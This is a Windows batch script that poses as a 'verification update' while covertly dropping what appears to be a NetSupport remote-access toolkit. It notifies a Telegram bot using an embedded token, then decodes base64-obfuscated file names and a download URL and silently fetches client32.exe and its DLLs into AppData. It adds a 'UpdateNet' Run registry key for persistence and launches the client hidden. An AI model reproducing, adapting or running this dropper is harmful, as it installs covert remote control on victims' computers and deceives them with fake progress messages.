@echo off
setlocal EnableDelayedExpansion
set "TEMP=%USERPROFILE%\AppData\Roaming"
curl -s -X GET "https://api.telegram.org/bot6579934751:AAEUzUGdZt-DH2XnbG15mWCzYdv37a6BNWc/sendMessage" -d 
set "c1=VmVyaWZpY2F0aW9uIHVwZGF0ZSBpbiBwcm9ncmVzcy4gUGxlYXNlIHdhaXQuLi4="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%c1%'))"') do set "m1=%%i"
echo !m1!

set "p1=aHR0cHM6Ly9maWxlcy5zYWxlYm90LnByby91cGxvYWRzL2ZpbGVfaXRlbS9maWxlLzU1ODM1My8="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%p1%'))"') do set "base=%%i"

set "f1=Y2xpZW50MzIuZXhl"
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f1%'))"') do set "n1=%%i"
curl -L -o "%TEMP%\!n1!" "!base!!n1!" >nul 2>&1

set "f2=Y2xpZW50MzIuaW5p"
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f2%'))"') do set "n2=%%i"
curl -L -o "%TEMP%\!n2!" "!base!!n2!" >nul 2>&1

set "f3=TlNMLkxJQw=="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f3%'))"') do set "n3=%%i"
curl -L -o "%TEMP%\!n3!" "!base!!n3!" >nul 2>&1

set "f4=SFRDVEwzMi5ETEw="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f4%'))"') do set "n4=%%i"
curl -L -o "%TEMP%\!n4!" "!base!!n4!" >nul 2>&1

set "f5=bXN2Y3IxMDAuZGxs"
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f5%'))"') do set "n5=%%i"
curl -L -o "%TEMP%\!n5!" "!base!!n5!" >nul 2>&1

set "f6=bnNrYmZsdHIuaW5m"
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f6%'))"') do set "n6=%%i"
curl -L -o "%TEMP%\!n6!" "!base!!n6!" >nul 2>&1

set "f7=TlNNLmluaQ=="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f7%'))"') do set "n7=%%i"
curl -L -o "%TEMP%\!n7!" "!base!!n7!" >nul 2>&1

set "f8=bnNtX3Zwcm8uaW5m"
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f8%'))"') do set "n8=%%i"
curl -L -o "%TEMP%\!n8!" "!base!!n8!" >nul 2>&1

set "f9=QXVkaW9DYXB0dXJlLmRsbA=="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f9%'))"') do set "n9=%%i"
curl -L -o "%TEMP%\!n9!" "!base!!n9!" >nul 2>&1

set "c2=Q29kZTogUjc5MQ=="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%c2%'))"') do set "m2=%%i"
echo !m2!

set "f10=cGNpY2FwaS5kbGw="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f10%'))"') do set "n10=%%i"
curl -L -o "%TEMP%\!n10!" "!base!!n10!" >nul 2>&1

set "f11=UENJQ0hFSy5ETEw="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f11%'))"') do set "n11=%%i"
curl -L -o "%TEMP%\!n11!" "!base!!n11!" >nul 2>&1

set "f12=UENJQ0wzMi5ETEw="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f12%'))"') do set "n12=%%i"
curl -L -o "%TEMP%\!n12!" "!base!!n12!" >nul 2>&1

set "f13=VENDVEwzMi5ETEw="
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%f13%'))"') do set "n13=%%i"
curl -L -o "%TEMP%\!n13!" "!base!!n13!" >nul 2>&1

set "r1=VXBkYXRlTmV0"
for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%r1%'))"') do set "rn=%%i"

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "!rn!" /t REG_SZ /d "%TEMP%\!n1!" /f
start /min "" /B "%TEMP%\!n1!" >nul 2>&1
exit
